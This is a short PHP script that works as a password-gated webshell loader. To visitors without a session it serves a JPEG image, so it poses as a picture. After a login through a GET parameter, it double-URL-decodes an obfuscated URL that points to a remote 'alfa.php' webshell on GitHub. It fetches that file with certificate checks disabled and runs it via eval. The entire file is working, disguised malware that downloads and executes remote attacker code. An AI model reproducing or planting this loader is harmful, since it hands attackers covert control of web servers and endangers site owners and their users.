<?php

session_start();

function is_logged_in() {
    return isset($_SESSION['jzex']);
}

function login($password) {
    $valid_password_hash = '$2y$12$i2Xk99gwWY9winlQx5iChOW88OA9uo1Oun52VyjFBJ8hBLrlxHMTi';
    if (password_verify($password, $valid_password_hash)) {
        $_SESSION['jzex'] = 'user';
        return true;
    } else {
        return false;
    }
}

function logout() {
    unset($_SESSION['jzex']);
}

if (isset($_GET['password'])) {
    $password = $_GET['password'];
    if (login($password)) {
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $error_message = "Password salah!";
        echo '<script>alert("'.$error_message.'");</script>';
    }
}

function getContent($url) {
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    $content = curl_exec($curl);
    curl_close($curl);
    return $content;
}

$encoded_url = '%25%36%38%25%37%34%25%37%34%25%37%30%25%37%33%25%33%61%25%32%66%25%32%66%25%37%32%25%36%31%25%37%37%25%32%65%25%36%37%25%36%39%25%37%34%25%36%38%25%37%35%25%36%32%25%37%35%25%37%33%25%36%35%25%37%32%25%36%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%65%25%36%33%25%36%66%25%36%64%25%32%66%25%37%34%25%37%35%25%36%35%25%36%65%25%36%37%25%36%35%25%37%32%25%37%33%25%33%31%25%33%30%25%33%31%25%33%30%25%32%66%25%37%37%25%36%35%25%36%32%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%66%25%37%32%25%36%35%25%36%36%25%37%33%25%32%66%25%36%38%25%36%35%25%36%31%25%36%34%25%37%33%25%32%66%25%36%64%25%36%31%25%36%39%25%36%65%25%32%66%25%36%31%25%36%63%25%36%36%25%36%31%25%32%65%25%37%30%25%36%38%25%37%30';

$decoded_url = urldecode(urldecode($encoded_url));
if (is_logged_in()) {
    if ($decoded_url) {
        $content = getContent($decoded_url);
        eval('?>' . $content);
        exit;
    }
} else {
    header('Content-Type: image/jpeg');
    $image_path = 'https://e.top4top.io/p_3527yawma0.jpg';
    readfile($image_path);
}

?>

